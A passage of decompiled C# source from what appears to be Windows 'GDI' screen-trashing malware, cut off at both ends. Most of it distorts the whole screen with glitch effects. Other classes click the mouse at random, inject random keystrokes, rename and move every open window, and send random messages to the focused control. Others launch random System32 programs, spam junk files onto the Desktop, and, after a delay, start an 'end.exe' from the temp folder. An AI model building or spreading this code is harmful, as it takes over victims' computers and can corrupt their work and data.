			private static int ballPosY1 = GDI.Drawer15.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

			// Token: 0x04000071 RID: 113
			private static int moveStepX1 = GDI.Drawer15.r.Next(1, 17);

			// Token: 0x04000072 RID: 114
			private static int moveStepY1 = GDI.Drawer15.r.Next(1, 17);

			// Token: 0x04000073 RID: 115
			private static int ballWidth2 = 0;

			// Token: 0x04000074 RID: 116
			private static int ballHeight2 = 0;

			// Token: 0x04000075 RID: 117
			private static int ballPosX2 = GDI.Drawer15.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

			// Token: 0x04000076 RID: 118
			private static int ballPosY2 = GDI.Drawer15.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

			// Token: 0x04000077 RID: 119
			private static int moveStepX2 = GDI.Drawer15.r.Next(1, 17);

			// Token: 0x04000078 RID: 120
			private static int moveStepY2 = GDI.Drawer15.r.Next(1, 17);
		}

		// Token: 0x0200001C RID: 28
		private class Drawer16 : GDI.Drawer
		{
			// Token: 0x06000093 RID: 147 RVA: 0x00007898 File Offset: 0x00005A98
			public override void Draw(IntPtr hdc)
			{
				try
				{
					IntPtr intPtr = GDI.CreateCompatibleDC(hdc);
					IntPtr intPtr2 = GDI.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
					GDI.SelectObject(intPtr, intPtr2);
					GDI.BitBlt(intPtr, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
					for (int i = 0; i < this.screenW; i++)
					{
						GDI.BitBlt(intPtr, 0, i, this.screenW, 1, intPtr, this.random.Next(-5, 6), i, 13369376);
					}
					Graphics graphics = Graphics.FromHdc(intPtr);
					GDI.Drawer16.ballPosX += GDI.Drawer16.moveStepX;
					bool flag = GDI.Drawer16.ballPosX < 0 || GDI.Drawer16.ballPosX + GDI.Drawer16.ballWidth > this.screenW;
					if (flag)
					{
						GDI.Drawer16.moveStepX = -GDI.Drawer16.moveStepX;
					}
					GDI.Drawer16.ballPosY += GDI.Drawer16.moveStepY;
					bool flag2 = GDI.Drawer16.ballPosY < 0 || GDI.Drawer16.ballPosY + GDI.Drawer16.ballHeight > this.screenH;
					if (flag2)
					{
						GDI.Drawer16.moveStepY = -GDI.Drawer16.moveStepY;
					}
					GDI.Drawer16.ballPosX1 += GDI.Drawer16.moveStepX1;
					bool flag3 = GDI.Drawer16.ballPosX1 < 0 || GDI.Drawer16.ballPosX1 + GDI.Drawer16.ballWidth1 > this.screenW;
					if (flag3)
					{
						GDI.Drawer16.moveStepX1 = -GDI.Drawer16.moveStepX1;
					}
					GDI.Drawer16.ballPosY1 += GDI.Drawer16.moveStepY1;
					bool flag4 = GDI.Drawer16.ballPosY1 < 0 || GDI.Drawer16.ballPosY1 + GDI.Drawer16.ballHeight1 > this.screenH;
					if (flag4)
					{
						GDI.Drawer16.moveStepY1 = -GDI.Drawer16.moveStepY1;
					}
					GDI.Drawer16.ballPosX2 += GDI.Drawer16.moveStepX2;
					bool flag5 = GDI.Drawer16.ballPosX2 < 0 || GDI.Drawer16.ballPosX2 + GDI.Drawer16.ballWidth2 > this.screenW;
					if (flag5)
					{
						GDI.Drawer16.moveStepX2 = -GDI.Drawer16.moveStepX2;
					}
					GDI.Drawer16.ballPosY2 += GDI.Drawer16.moveStepY2;
					bool flag6 = GDI.Drawer16.ballPosY2 < 0 || GDI.Drawer16.ballPosY2 + GDI.Drawer16.ballHeight2 > this.screenH;
					if (flag6)
					{
						GDI.Drawer16.moveStepY2 = -GDI.Drawer16.moveStepY2;
					}
					this.cc += 10;
					GDI.HSL hsl = new GDI.HSL(this.cc % 120, 1f, 0.5f);
					GDI.RGB rgb = GDI.HSLToRGB(hsl);
					Brush brush = new SolidBrush(Color.FromArgb((int)rgb.R, (int)rgb.G, (int)rgb.B));
					Pen pen = new Pen(Color.Red);
					PointF pointF = new PointF((float)GDI.Drawer16.ballPosX, (float)GDI.Drawer16.ballPosY);
					PointF pointF2 = new PointF((float)GDI.Drawer16.ballPosX1, (float)GDI.Drawer16.ballPosY1);
					PointF pointF3 = new PointF((float)GDI.Drawer16.ballPosX2, (float)GDI.Drawer16.ballPosY2);
					PointF[] array = new PointF[] { pointF, pointF2, pointF3 };
					graphics.FillPolygon(brush, array);
					GDI.BitBlt(hdc, 0, 0, this.screenW, this.screenH, intPtr, 0, 0, 13369376);
					GDI.DeleteObject(intPtr);
					GDI.DeleteObject(intPtr2);
					Thread.Sleep(this.random.Next(10));
				}
				catch
				{
				}
			}

			// Token: 0x04000079 RID: 121
			private int redrawCounter;

			// Token: 0x0400007A RID: 122
			private int redrawCounter2;

			// Token: 0x0400007B RID: 123
			private static Random r = new Random();

			// Token: 0x0400007C RID: 124
			private int cc;

			// Token: 0x0400007D RID: 125
			private static int ballWidth = 0;

			// Token: 0x0400007E RID: 126
			private static int ballHeight = 0;

			// Token: 0x0400007F RID: 127
			private static int ballPosX = GDI.Drawer16.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

			// Token: 0x04000080 RID: 128
			private static int ballPosY = GDI.Drawer16.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

			// Token: 0x04000081 RID: 129
			private static int moveStepX = GDI.Drawer16.r.Next(1, 17);

			// Token: 0x04000082 RID: 130
			private static int moveStepY = GDI.Drawer16.r.Next(1, 17);

			// Token: 0x04000083 RID: 131
			private static int ballWidth1 = 0;

			// Token: 0x04000084 RID: 132
			private static int ballHeight1 = 0;

			// Token: 0x04000085 RID: 133
			private static int ballPosX1 = GDI.Drawer16.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

			// Token: 0x04000086 RID: 134
			private static int ballPosY1 = GDI.Drawer16.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

			// Token: 0x04000087 RID: 135
			private static int moveStepX1 = GDI.Drawer16.r.Next(1, 17);

			// Token: 0x04000088 RID: 136
			private static int moveStepY1 = GDI.Drawer16.r.Next(1, 17);

			// Token: 0x04000089 RID: 137
			private static int ballWidth2 = 0;

			// Token: 0x0400008A RID: 138
			private static int ballHeight2 = 0;

			// Token: 0x0400008B RID: 139
			private static int ballPosX2 = GDI.Drawer16.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

			// Token: 0x0400008C RID: 140
			private static int ballPosY2 = GDI.Drawer16.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

			// Token: 0x0400008D RID: 141
			private static int moveStepX2 = GDI.Drawer16.r.Next(1, 17);

			// Token: 0x0400008E RID: 142
			private static int moveStepY2 = GDI.Drawer16.r.Next(1, 17);
		}

		// Token: 0x0200001D RID: 29
		private class Drawer17 : GDI.Drawer
		{
			// Token: 0x06000096 RID: 150 RVA: 0x00007D80 File Offset: 0x00005F80
			public override void Draw(IntPtr hdc)
			{
				try
				{
					IntPtr intPtr = GDI.CreateCompatibleDC(hdc);
					IntPtr intPtr2 = GDI.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
					GDI.SelectObject(intPtr, intPtr2);
					GDI.BitBlt(intPtr, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
					for (int i = 0; i < 100; i++)
					{
						int num = this.random.Next(-this.screenW, this.screenW + this.screenW);
						int num2 = this.random.Next(-this.screenH, this.screenH + this.screenH);
						int num3 = this.random.Next(-this.screenW, this.screenW + this.screenW);
						int num4 = this.random.Next(-this.screenH, this.screenH + this.screenH);
						GDI.BitBlt(intPtr, num, num2, num3, num4, intPtr, num + this.random.Next(-10, 11), num2 + this.random.Next(-10, 11), 13369376);
					}
					Graphics graphics = Graphics.FromHdc(intPtr);
					for (int j = 0; j < this.screenH; j += 2)
					{
						this.cc++;
						GDI.HSL hsl = new GDI.HSL(this.cc % 120, 1f, 0.5f);
						GDI.RGB rgb = GDI.HSLToRGB(hsl);
						Pen pen = new Pen(Color.FromArgb(128, (int)rgb.R, (int)rgb.G, (int)rgb.B), 1f);
						graphics.DrawLine(pen, 0, j, this.screenW, j);
					}
					global::System.Type typeFromHandle = typeof(Cursors);
					PropertyInfo[] properties = typeFromHandle.GetProperties(BindingFlags.Static | BindingFlags.Public);
					foreach (PropertyInfo propertyInfo in properties)
					{
						Point point = new Point(this.random.Next(this.screenW), this.random.Next(this.screenH));
						Cursor cursor = (Cursor)propertyInfo.GetValue(null, null);
						cursor.Draw(graphics, new Rectangle(point, cursor.Size));
					}
					Bitmap bitmap = this.app.ToBitmap();
					Bitmap bitmap2 = this.warn_ico.ToBitmap();
					Bitmap bitmap3 = this.no_ico.ToBitmap();
					graphics.DrawImage(bitmap, this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(200), this.random.Next(200));
					graphics.DrawImage(bitmap2, this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(200), this.random.Next(200));
					graphics.DrawImage(bitmap3, this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(200), this.random.Next(200));
					GDI._BLENDFUNCTION blendfunction = default(GDI._BLENDFUNCTION);
					blendfunction.BlendOp = 0;
					blendfunction.BlendFlags = 0;
					blendfunction.SourceConstantAlpha = (byte)this.random.Next(255);
					blendfunction.AlphaFormat = 0;
					GDI.AlphaBlend(hdc, 0, 0, this.screenW, this.screenH, intPtr, 0, 0, this.screenW, this.screenH, blendfunction);
					GDI.DeleteObject(intPtr);
					GDI.DeleteObject(intPtr2);
					graphics.Dispose();
				}
				catch
				{
				}
			}

			// Token: 0x0400008F RID: 143
			private int cc;

			// Token: 0x04000090 RID: 144
			private Icon app = GDI.Extract("user32.dll", 5, true);

			// Token: 0x04000091 RID: 145
			private Icon warn_ico = GDI.Extract("user32.dll", 1, true);

			// Token: 0x04000092 RID: 146
			private Icon no_ico = GDI.Extract("user32.dll", 3, true);
		}

		// Token: 0x0200001E RID: 30
		private class Drawer18 : GDI.Drawer
		{
			// Token: 0x06000098 RID: 152 RVA: 0x000081A8 File Offset: 0x000063A8
			public override void Draw(IntPtr hdc)
			{
				try
				{
					IntPtr intPtr = GDI.CreateCompatibleDC(hdc);
					IntPtr intPtr2 = GDI.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
					GDI.SelectObject(intPtr, intPtr2);
					GDI.BitBlt(intPtr, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
					for (int i = 0; i < 500; i++)
					{
						int num = this.random.Next(-this.screenW, this.screenW + this.screenW);
						int num2 = this.random.Next(-this.screenH, this.screenH + this.screenH);
						int num3 = this.random.Next(-this.screenW, this.screenW + this.screenW);
						int num4 = this.random.Next(-this.screenH, this.screenH + this.screenH);
						GDI.BitBlt(intPtr, num, num2, num3, num4, intPtr, num + this.random.Next(-1, 2), num2 + this.random.Next(-1, 2), 13369376);
					}
					GDI._BLENDFUNCTION blendfunction = default(GDI._BLENDFUNCTION);
					blendfunction.BlendOp = 0;
					blendfunction.BlendFlags = 0;
					blendfunction.SourceConstantAlpha = 127;
					blendfunction.AlphaFormat = 0;
					GDI.AlphaBlend(hdc, 0, 0, this.screenW, this.screenH, intPtr, 0, 0, this.screenW, this.screenH, blendfunction);
					GDI.DeleteObject(intPtr);
					GDI.DeleteObject(intPtr2);
					Thread.Sleep(this.random.Next(10));
				}
				catch
				{
				}
			}

			// Token: 0x04000093 RID: 147
			private int redrawCounter;
		}

		// Token: 0x0200001F RID: 31
		private class Drawer19 : GDI.Drawer
		{
			// Token: 0x0600009A RID: 154 RVA: 0x0000836C File Offset: 0x0000656C
			public override void Draw(IntPtr hdc)
			{
				try
				{
					IntPtr intPtr = GDI.CreateCompatibleDC(hdc);
					IntPtr intPtr2 = GDI.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
					GDI.SelectObject(intPtr, intPtr2);
					GDI.BitBlt(intPtr, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
					for (int i = 0; i < this.screenW; i++)
					{
						GDI.BitBlt(intPtr, 0, i, this.screenW, 1, intPtr, this.random.Next(-5, 6), i, 13369376);
					}
					Graphics graphics = Graphics.FromHdc(intPtr);
					GDI.Drawer19.ballPosX += GDI.Drawer19.moveStepX;
					bool flag = GDI.Drawer19.ballPosX < 0 || GDI.Drawer19.ballPosX + GDI.Drawer19.ballWidth > this.screenW;
					if (flag)
					{
						GDI.Drawer19.moveStepX = -GDI.Drawer19.moveStepX;
					}
					GDI.Drawer19.ballPosY += GDI.Drawer19.moveStepY;
					bool flag2 = GDI.Drawer19.ballPosY < 0 || GDI.Drawer19.ballPosY + GDI.Drawer19.ballHeight > this.screenH;
					if (flag2)
					{
						GDI.Drawer19.moveStepY = -GDI.Drawer19.moveStepY;
					}
					GDI.Drawer19.ballPosX1 += GDI.Drawer19.moveStepX1;
					bool flag3 = GDI.Drawer19.ballPosX1 < 0 || GDI.Drawer19.ballPosX1 + GDI.Drawer19.ballWidth1 > this.screenW;
					if (flag3)
					{
						GDI.Drawer19.moveStepX1 = -GDI.Drawer19.moveStepX1;
					}
					GDI.Drawer19.ballPosY1 += GDI.Drawer19.moveStepY1;
					bool flag4 = GDI.Drawer19.ballPosY1 < 0 || GDI.Drawer19.ballPosY1 + GDI.Drawer19.ballHeight1 > this.screenH;
					if (flag4)
					{
						GDI.Drawer19.moveStepY1 = -GDI.Drawer19.moveStepY1;
					}
					GDI.Drawer19.ballPosX2 += GDI.Drawer19.moveStepX2;
					bool flag5 = GDI.Drawer19.ballPosX2 < 0 || GDI.Drawer19.ballPosX2 + GDI.Drawer19.ballWidth2 > this.screenW;
					if (flag5)
					{
						GDI.Drawer19.moveStepX2 = -GDI.Drawer19.moveStepX2;
					}
					GDI.Drawer19.ballPosY2 += GDI.Drawer19.moveStepY2;
					bool flag6 = GDI.Drawer19.ballPosY2 < 0 || GDI.Drawer19.ballPosY2 + GDI.Drawer19.ballHeight2 > this.screenH;
					if (flag6)
					{
						GDI.Drawer19.moveStepY2 = -GDI.Drawer19.moveStepY2;
					}
					GDI.Drawer19.ballPosX3 += GDI.Drawer19.moveStepX3;
					bool flag7 = GDI.Drawer19.ballPosX3 < 0 || GDI.Drawer19.ballPosX3 + GDI.Drawer19.ballWidth3 > this.screenW;
					if (flag7)
					{
						GDI.Drawer19.moveStepX3 = -GDI.Drawer19.moveStepX3;
					}
					GDI.Drawer19.ballPosY3 += GDI.Drawer19.moveStepY3;
					bool flag8 = GDI.Drawer19.ballPosY3 < 0 || GDI.Drawer19.ballPosY3 + GDI.Drawer19.ballHeight3 > this.screenH;
					if (flag8)
					{
						GDI.Drawer19.moveStepY3 = -GDI.Drawer19.moveStepY3;
					}
					this.cc += 10;
					GDI.HSL hsl = new GDI.HSL(this.cc % 240, 1f, 0.5f);
					GDI.RGB rgb = GDI.HSLToRGB(hsl);
					Pen pen = new Pen(Color.FromArgb((int)rgb.R, (int)rgb.G, (int)rgb.B), 32f);
					pen.StartCap = (pen.EndCap = LineCap.Round);
					Point point = new Point(GDI.Drawer19.ballPosX, GDI.Drawer19.ballPosY);
					Point point2 = new Point(GDI.Drawer19.ballPosX1, GDI.Drawer19.ballPosY1);
					Point point3 = new Point(GDI.Drawer19.ballPosX2, GDI.Drawer19.ballPosY2);
					Point point4 = new Point(GDI.Drawer19.ballPosX3, GDI.Drawer19.ballPosY3);
					graphics.DrawBezier(pen, point, point2, point3, point4);
					GDI.BitBlt(hdc, 0, 0, this.screenW, this.screenH, intPtr, 0, 0, 13369376);
					GDI.DeleteObject(intPtr);
					GDI.DeleteObject(intPtr2);
					Thread.Sleep(this.random.Next(10));
				}
				catch
				{
				}
			}

			// Token: 0x04000094 RID: 148
			private int redrawCounter;

			// Token: 0x04000095 RID: 149
			private int redrawCounter2;

			// Token: 0x04000096 RID: 150
			private static Random r = new Random();

			// Token: 0x04000097 RID: 151
			private int cc;

			// Token: 0x04000098 RID: 152
			private static int ballWidth = 0;

			// Token: 0x04000099 RID: 153
			private static int ballHeight = 0;

			// Token: 0x0400009A RID: 154
			private static int ballPosX = GDI.Drawer19.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

			// Token: 0x0400009B RID: 155
			private static int ballPosY = GDI.Drawer19.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

			// Token: 0x0400009C RID: 156
			private static int moveStepX = GDI.Drawer19.r.Next(1, 17);

			// Token: 0x0400009D RID: 157
			private static int moveStepY = GDI.Drawer19.r.Next(1, 17);

			// Token: 0x0400009E RID: 158
			private static int ballWidth1 = 0;

			// Token: 0x0400009F RID: 159
			private static int ballHeight1 = 0;

			// Token: 0x040000A0 RID: 160
			private static int ballPosX1 = GDI.Drawer19.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

			// Token: 0x040000A1 RID: 161
			private static int ballPosY1 = GDI.Drawer19.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

			// Token: 0x040000A2 RID: 162
			private static int moveStepX1 = GDI.Drawer19.r.Next(1, 17);

			// Token: 0x040000A3 RID: 163
			private static int moveStepY1 = GDI.Drawer19.r.Next(1, 17);

			// Token: 0x040000A4 RID: 164
			private static int ballWidth2 = 0;

			// Token: 0x040000A5 RID: 165
			private static int ballHeight2 = 0;

			// Token: 0x040000A6 RID: 166
			private static int ballPosX2 = GDI.Drawer19.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

			// Token: 0x040000A7 RID: 167
			private static int ballPosY2 = GDI.Drawer19.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

			// Token: 0x040000A8 RID: 168
			private static int moveStepX2 = GDI.Drawer19.r.Next(1, 17);

			// Token: 0x040000A9 RID: 169
			private static int moveStepY2 = GDI.Drawer19.r.Next(1, 17);

			// Token: 0x040000AA RID: 170
			private static int ballWidth3 = 0;

			// Token: 0x040000AB RID: 171
			private static int ballHeight3 = 0;

			// Token: 0x040000AC RID: 172
			private static int ballPosX3 = GDI.Drawer19.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

			// Token: 0x040000AD RID: 173
			private static int ballPosY3 = GDI.Drawer19.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

			// Token: 0x040000AE RID: 174
			private static int moveStepX3 = GDI.Drawer19.r.Next(1, 17);

			// Token: 0x040000AF RID: 175
			private static int moveStepY3 = GDI.Drawer19.r.Next(1, 17);
		}

		// Token: 0x02000020 RID: 32
		private class Drawer20 : GDI.Drawer
		{
			// Token: 0x0600009D RID: 157 RVA: 0x00008950 File Offset: 0x00006B50
			public override void Draw(IntPtr hdc)
			{
				try
				{
					IntPtr intPtr = GDI.CreateCompatibleDC(hdc);
					IntPtr intPtr2 = GDI.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
					GDI.SelectObject(intPtr, intPtr2);
					GDI.BitBlt(intPtr, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
					Graphics graphics = Graphics.FromHdc(intPtr);
					float num = 0f;
					float num2 = 0f;
					float num3 = 100f;
					for (float num4 = 0f; num4 < (float)(Screen.PrimaryScreen.Bounds.Height / 10); num4 += 0.1f)
					{
						float num5 = (float)Math.Sin((double)num4);
						this.redrawCounter2++;
						int num6 = this.redrawCounter2;
						int num7 = (int)Math.Round((double)(num * num3 + num2));
						GDI.BitBlt(intPtr, num7, num6, this.screenW, 1, intPtr, 0, num6, 13369376);
						GDI.BitBlt(intPtr, this.screenW + num7, num6, this.screenW, 1, intPtr, 0, num6, 13369376);
						GDI.BitBlt(intPtr, -this.screenW + num7, num6, this.screenW, 1, intPtr, 0, num6, 13369376);
						bool flag = this.redrawCounter2 >= this.screenH;
						if (flag)
						{
							this.redrawCounter2 = 0;
						}
						num = num5;
					}
					GDI.Drawer20.ballPosX += GDI.Drawer20.moveStepX;
					bool flag2 = GDI.Drawer20.ballPosX < 0 || GDI.Drawer20.ballPosX + GDI.Drawer20.ballWidth > this.screenW;
					if (flag2)
					{
						GDI.Drawer20.moveStepX = -GDI.Drawer20.moveStepX;
					}
					GDI.Drawer20.ballPosY += GDI.Drawer20.moveStepY;
					bool flag3 = GDI.Drawer20.ballPosY < 0 || GDI.Drawer20.ballPosY + GDI.Drawer20.ballHeight > this.screenH;
					if (flag3)
					{
						GDI.Drawer20.moveStepY = -GDI.Drawer20.moveStepY;
					}
					this.cc += 10;
					GDI.HSL hsl = new GDI.HSL(this.cc % 240, 1f, 0.5f);
					GDI.RGB rgb = GDI.HSLToRGB(hsl);
					Brush brush = new SolidBrush(Color.FromArgb((int)rgb.R, (int)rgb.G, (int)rgb.B));
					Pen pen = new Pen(Color.Red);
					graphics.FillEllipse(brush, GDI.Drawer20.ballPosX, GDI.Drawer20.ballPosY, GDI.Drawer20.ballWidth, GDI.Drawer20.ballHeight);
					for (int i = 0; i < 100; i += 10)
					{
						graphics.DrawEllipse(pen, GDI.Drawer20.ballPosX - i / 2, GDI.Drawer20.ballPosY - i / 2, GDI.Drawer20.ballWidth + i, GDI.Drawer20.ballHeight + i);
					}
					GDI.BitBlt(hdc, 0, 0, this.screenW, this.screenH, intPtr, 0, 0, 13369376);
					GDI.DeleteObject(intPtr);
					GDI.DeleteObject(intPtr2);
					Thread.Sleep(this.random.Next(10));
				}
				catch
				{
				}
			}

			// Token: 0x040000B0 RID: 176
			private int redrawCounter2;

			// Token: 0x040000B1 RID: 177
			private int redrawCounter;

			// Token: 0x040000B2 RID: 178
			private static Random r = new Random();

			// Token: 0x040000B3 RID: 179
			private int cc;

			// Token: 0x040000B4 RID: 180
			private static int ballWidth = 200;

			// Token: 0x040000B5 RID: 181
			private static int ballHeight = 200;

			// Token: 0x040000B6 RID: 182
			private static int ballPosX = GDI.Drawer20.r.Next(Screen.PrimaryScreen.Bounds.Width - 200);

			// Token: 0x040000B7 RID: 183
			private static int ballPosY = GDI.Drawer20.r.Next(Screen.PrimaryScreen.Bounds.Height - 200);

			// Token: 0x040000B8 RID: 184
			private static int moveStepX = 10;

			// Token: 0x040000B9 RID: 185
			private static int moveStepY = 10;
		}

		// Token: 0x02000021 RID: 33
		private class Cur : GDI.Drawer
		{
			// Token: 0x060000A0 RID: 160 RVA: 0x00008CFC File Offset: 0x00006EFC
			public override void Draw(IntPtr hdc)
			{
				try
				{
					Cursor.Position = new Point(this.random.Next(this.screenW), this.random.Next(this.screenH));
					GDI.DoMouseClick();
					Thread.Sleep(this.random.Next(0, 1000));
				}
				catch
				{
				}
				Thread.Sleep(0);
			}
		}

		// Token: 0x02000022 RID: 34
		private class Windowtext : GDI.Drawer
		{
			// Token: 0x060000A2 RID: 162 RVA: 0x00008D80 File Offset: 0x00006F80
			public override void Draw(IntPtr hdc)
			{
				try
				{
					Process process = new Process();
					Process[] processes = Process.GetProcesses();
					foreach (Process process2 in processes)
					{
						IntPtr mainWindowHandle = process2.MainWindowHandle;
						bool flag = mainWindowHandle != IntPtr.Zero;
						if (flag)
						{
							Random random = new Random();
							int num = random.Next(4, 10);
							string text = "";
							for (int j = 0; j < num; j++)
							{
								int num2 = random.Next(0, 6969);
								text += Convert.ToChar(num2 + random.Next(0, 6969)).ToString();
							}
							GDI.SetWindowText(GDI.GetForegroundWindow(), text);
							GDI.SetWindowText(process2.Handle, text);
							GDI.SetWindowText(mainWindowHandle, text);
							Thread.Sleep(0);
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x02000023 RID: 35
		private class Type : GDI.Drawer
		{
			// Token: 0x060000A4 RID: 164 RVA: 0x00008E94 File Offset: 0x00007094
			public override void Draw(IntPtr hdc)
			{
				try
				{
					Random random = new Random();
					int num = random.Next(4, 10);
					string text = "";
					for (int i = 0; i < num; i++)
					{
						int num2 = random.Next(0, 6969);
						text += Convert.ToChar(num2 + random.Next(0, 6969)).ToString();
					}
					SendKeys.SendWait(text);
					Thread.Sleep(this.random.Next(1000));
				}
				catch
				{
				}
			}
		}

		// Token: 0x02000024 RID: 36
		private class Window : GDI.Drawer
		{
			// Token: 0x060000A6 RID: 166 RVA: 0x00008F44 File Offset: 0x00007144
			public override void Draw(IntPtr hdc)
			{
				Process process = new Process();
				Process[] processes = Process.GetProcesses();
				foreach (Process process2 in processes)
				{
					try
					{
						Console.WriteLine("Process Name: {0} ", process2.ProcessName);
						IntPtr mainWindowHandle = process2.MainWindowHandle;
						bool flag = mainWindowHandle != IntPtr.Zero;
						if (flag)
						{
							Random random = new Random();
							GDI.MoveWindow(GDI.GetForegroundWindow(), this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(this.screenW), this.random.Next(this.screenH), true);
							GDI.MoveWindow(mainWindowHandle, this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(this.screenW), this.random.Next(this.screenH), true);
							GDI.MoveWindow(process2.Handle, this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(this.screenW), this.random.Next(this.screenH), true);
							GDI.MoveWindow(hdc, this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(this.screenW), this.random.Next(this.screenH), true);
							Thread.Sleep(this.random.Next(0, 30000));
						}
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x02000025 RID: 37
		private class Open : GDI.Drawer
		{
			// Token: 0x060000A8 RID: 168 RVA: 0x00009138 File Offset: 0x00007338
			public override void Draw(IntPtr hdc)
			{
				try
				{
					Random random = new Random();
					string[] files = Directory.GetFiles("c:\\Windows\\System32");
					Process.Start(files[random.Next(files.Length)]);
					Thread.Sleep(this.random.Next(15000, 30000));
				}
				catch
				{
				}
			}
		}

		// Token: 0x02000026 RID: 38
		private class SendM : GDI.Drawer
		{
			// Token: 0x060000AA RID: 170 RVA: 0x000091A8 File Offset: 0x000073A8
			public override void Draw(IntPtr hdc)
			{
				try
				{
					Process process = new Process();
					Process[] processes = Process.GetProcesses();
					foreach (Process process2 in processes)
					{
						IntPtr mainWindowHandle = process2.MainWindowHandle;
						bool flag = mainWindowHandle != IntPtr.Zero;
						if (flag)
						{
							int num = this.random.Next(100);
							string text = "";
							for (int j = 0; j < num; j++)
							{
								int num2 = this.random.Next(0, 255);
								text += Convert.ToChar(num2 + this.random.Next(0, 255)).ToString();
							}
							string text2 = text;
							GDI.SetWindowText(mainWindowHandle, text2);
							GDI.SetWindowText(process2.Handle, text);
							StringBuilder stringBuilder = new StringBuilder(32767);
							uint windowThreadProcessId = GDI.GetWindowThreadProcessId((int)GDI.GetForegroundWindow(), 0);
							uint currentThreadId = GDI.GetCurrentThreadId();
							GDI.AttachThreadInput(windowThreadProcessId, currentThreadId, true);
							int focus = GDI.GetFocus();
							GDI.AttachThreadInput(windowThreadProcessId, currentThreadId, false);
							string text3 = text;
							char[] array2 = new char[1];
							for (int k = 0; k < array2.Length; k++)
							{
								array2[k] = text3[this.random.Next(text3.Length)];
							}
							string text4 = new string(array2);
							GDI.SendMessage(focus, this.random.Next(0, 255), stringBuilder.Capacity, stringBuilder);
							stringBuilder.Replace(text4, text);
							stringBuilder.Append(text);
							GDI.SendMessage(focus, this.random.Next(0, 255), 0, stringBuilder);
							Thread.Sleep(this.random.Next(5000));
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x02000027 RID: 39
		private class createfiles : GDI.Drawer
		{
			// Token: 0x060000AC RID: 172 RVA: 0x000093B8 File Offset: 0x000075B8
			public override void Draw(IntPtr hdc)
			{
				try
				{
					int num = this.random.Next(100);
					string text = "";
					for (int i = 0; i < num; i++)
					{
						int num2 = this.random.Next(0, 255);
						text += Convert.ToChar(num2 + this.random.Next(0, 255)).ToString();
					}
					int num3 = this.random.Next(100);
					string text2 = "";
					for (int j = 0; j < num3; j++)
					{
						int num4 = this.random.Next(0, 255);
						text2 += Convert.ToChar(num4 + this.random.Next(0, 255)).ToString();
					}
					string text3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), text + "." + text2);
					try
					{
						bool flag = File.Exists(text3);
						if (flag)
						{
							File.Delete(text3);
						}
						using (FileStream fileStream = File.Create(text3))
						{
							byte[] bytes = new UTF8Encoding(true).GetBytes(text);
							fileStream.Write(bytes, 0, bytes.Length);
							byte[] bytes2 = new UTF8Encoding(true).GetBytes(text2);
							fileStream.Write(bytes2, 0, bytes2.Length);
						}
						using (StreamReader streamReader = File.OpenText(text3))
						{
							string text4;
							while ((text4 = streamReader.ReadLine()) != null)
							{
								Console.WriteLine(text4);
							}
						}
					}
					catch (Exception ex)
					{
						Console.WriteLine(ex.ToString());
					}
					Thread.Sleep(this.random.Next(30000, 60000));
				}
				catch
				{
				}
			}
		}

		// Token: 0x02000028 RID: 40
		private class msg : GDI.Drawer
		{
			// Token: 0x060000AE RID: 174 RVA: 0x0000960C File Offset: 0x0000780C
			public override void Draw(IntPtr hdc)
			{
				try
				{
					Application.Run(new Form1());
				}
				catch
				{
				}
			}
		}

		// Token: 0x02000029 RID: 41
		private class ends : GDI.Drawer
		{
			// Token: 0x060000B0 RID: 176 RVA: 0x0000964C File Offset: 0x0000784C
			public override void Draw(IntPtr hdc)
			{
				Thread.Sleep(this.random.Next(600000));
				string text = Path.Combine(Path.GetTempPath(), "end.exe");
				Process.Start(text);
			}
		}

		// Token: 0x0200002A RID: 42
		private class bb : GDI.Drawer
		{
			// Token: 0x060000B2 RID: 178 RVA: 0x00009690 File Offset: 0x00007890
			public override void Draw(IntPtr hdc)
			{
				Random random = new Random(Guid.NewGuid().GetHashCode());
				switch (GDI.GetSomeRandomNumber(1, 21))
				{
				case 1:
					GDI.byte1(this.random.Next(44100), 15);
					break;
				case 2:
					GDI.byte2(this.random.Next(44100), 15);
					break;
				case 3:
					GDI.byte3(this.random.Next(44100), 15);
					break;
				case 4:
					GDI.byte4(this.random.Next(44100), 15);
					break;
				case 5:
					GDI.byte5(this.random.Next(44100), 15);
					break;
				case 6:
					GDI.byte6(this.random.Next(44100), 15);
					break;
				case 7:
					GDI.byte7(this.random.Next(44100), 15);
					break;
				case 8:
					GDI.byte8(this.random.Next(44100), 15);
					break;
				case 9:
					GDI.byte9(this.random.Next(44100), 15);
					break;
				case 10:
